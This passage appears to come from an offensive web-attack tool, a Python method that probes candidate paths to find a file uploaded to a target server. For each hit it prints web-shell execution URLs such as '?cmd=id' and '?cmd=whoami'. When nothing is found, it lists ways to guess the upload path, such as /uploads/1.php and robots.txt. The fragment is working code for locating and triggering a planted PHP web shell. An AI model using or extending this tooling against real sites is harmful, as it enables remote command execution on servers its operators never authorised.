            try:
                resp = self.session.head(full_url, timeout=timeout, allow_redirects=False)
                if resp.status_code == 200:
                    found.append(full_url)
                    results.append(f"[+] FOUND: {full_url}")
                elif resp.status_code in [301, 302, 303, 307, 308]:
                    results.append(f"[?] Redirect: {full_url} -> {resp.headers.get('Location', 'unknown')}")
            except Exception:
                pass

        results.append("")
        results.append("=== Summary ===")

        if found:
            results.append(f"Found {len(found)} location(s)!")
            results.append("")
            results.append("=== Found Locations ===")
            for url in found:
                results.append(f"  {url}")
            results.append("")
            results.append("=== Test Execution ===")
            for url in found:
                results.append(f"  {url}?cmd=id")
                results.append(f"  {url}?cmd=whoami")
        else:
            results.append("File not found in common locations.")
            results.append("")
            results.append("=== Suggestions ===")
            results.append("1. Check response for upload path disclosure")
            results.append("2. Try predictable naming: /uploads/1.php, /uploads/file.php")
            results.append("3. Look for path in cookies or headers")
            results.append("4. Check robots.txt for upload directories")

        return "\n".join(results)
